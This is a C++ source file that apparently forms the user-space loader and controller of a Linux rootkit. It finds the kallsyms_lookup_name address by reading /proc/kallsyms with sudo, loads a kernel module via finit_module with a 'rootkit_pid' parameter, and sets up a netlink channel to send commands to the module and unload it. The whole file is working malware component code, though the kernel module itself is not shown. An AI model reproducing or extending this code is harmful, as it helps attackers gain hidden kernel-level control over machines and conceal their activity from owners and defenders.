#include "kernel_access.h"

#include "../error_codes.h"

#include <linux/netlink.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string>
#include <sys/syscall.h>
#include <fcntl.h>

msg_to_user kernel_access::my_recv_msg() {
    size_t msg_size = sizeof(msg_to_user);

    struct nlmsghdr *nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(msg_size));
    memset(nlh, 0, NLMSG_SPACE(msg_size)); // initialized to zero
    nlh->nlmsg_len = NLMSG_SPACE(msg_size);
    nlh->nlmsg_pid = getpid(); // my pid
    nlh->nlmsg_flags = 0;

    struct iovec iov;
    memset((void *) &iov, '\x00', sizeof(iov)); // initialized to zero
    iov.iov_base = (void *) nlh; // iov -> nlh
    iov.iov_len = nlh->nlmsg_len;

    struct msghdr resp_msghdr;
    memset((void *) &resp_msghdr, '\x00', sizeof(resp_msghdr)); // initialized to zero
    resp_msghdr.msg_name = (void *) &dest_addr;
    resp_msghdr.msg_namelen = sizeof(dest_addr);
    resp_msghdr.msg_iov = &iov; // resp_msghdr -> iov
    resp_msghdr.msg_iovlen = 1;

    recvmsg(sock_fd, &resp_msghdr, 0);

    msg_to_user ret;
    memcpy((void *) &ret.data, NLMSG_DATA(nlh), sizeof(struct msg_to_user));
    free(nlh);

    return ret;
}

void kernel_access::my_send_msg(msg_to_module message) {
    size_t msg_size = sizeof(msg_to_module);

    struct nlmsghdr *nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(msg_size));
    memset(nlh, 0, NLMSG_SPACE(msg_size)); // initialized to zero
    nlh->nlmsg_len = NLMSG_SPACE(msg_size);
    nlh->nlmsg_pid = getpid(); // my pid
    nlh->nlmsg_flags = 0;

    memcpy(NLMSG_DATA(nlh), (void*) &message, msg_size);

    struct iovec iov;
    memset((void *) &iov, '\x00', sizeof(iov)); // initialized to zero
    iov.iov_base = (void *) nlh; // iov -> nlh
    iov.iov_len = nlh->nlmsg_len;

    struct msghdr msghdr;
    memset((void *) &msghdr, '\x00', sizeof(msghdr)); // initialized to zero
    msghdr.msg_name = (void *) &dest_addr;
    msghdr.msg_namelen = sizeof(dest_addr);
    msghdr.msg_iov = &iov; // msg -> iov
    msghdr.msg_iovlen = 1;

    int ret = sendmsg(sock_fd, &msghdr, 0);

    free(nlh);
}

unsigned long kernel_access::find_kallsyms() {
    FILE *stream = popen("sudo cat /proc/kallsyms | grep 'T kallsyms_lookup_name'", "r");
    if (stream == NULL)
        return 0;

    std::string str;
    char ch;
    while ((ch = fgetc(stream)) != ' ')
        str += ch;

    unsigned long addr = strtoul(str.c_str(), NULL, 16);
    return addr;
}


kernel_access::kernel_access() {
    // LOADING THE KERNEL MODULE

    // find kallsyms
    void *kallsyms_addr = (void *) find_kallsyms();

    // generate the module parameters
#define MAX_PARAMS_SIZE 200
    char params[MAX_PARAMS_SIZE];
    memset(params, '\x00', MAX_PARAMS_SIZE);
    sprintf(params, "kallsyms=%p rootkit_pid=%d", kallsyms_addr, getpid());

    // load the module
    int fd = open(MODULE_DIR MODULE_NAME MODULE_EXT, O_RDONLY);
    if (syscall(SYS_finit_module, fd, params, 0) == SYSCALL_ERROR) {
        close(fd);
        throw "init_module syscall error";
    }
    close(fd);


    // SETTING UP COMMUNICATION CHANNEL

    // open socket fd
    sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
    if (sock_fd == SOCKET_ERROR) {
        throw "socket error";
    }

    // setup and bind src addr
    struct sockaddr_nl src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid();

    if (bind(sock_fd, (struct sockaddr *) &src_addr, sizeof(src_addr)) == BIND_ERROR) {
        close(sock_fd);
        throw "bind error";
    }

    // setup destination addr
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0;
    dest_addr.nl_groups = 0;

}

kernel_access::~kernel_access() {
    msg_to_module exit_msg;
    memset(&exit_msg, '\x00', sizeof(exit_msg));
    exit_msg.id = OPER_EXIT_MODULE;
    my_send_msg(exit_msg);

    close(sock_fd);

    syscall(SYS_delete_module, MODULE_NAME, 0);
}

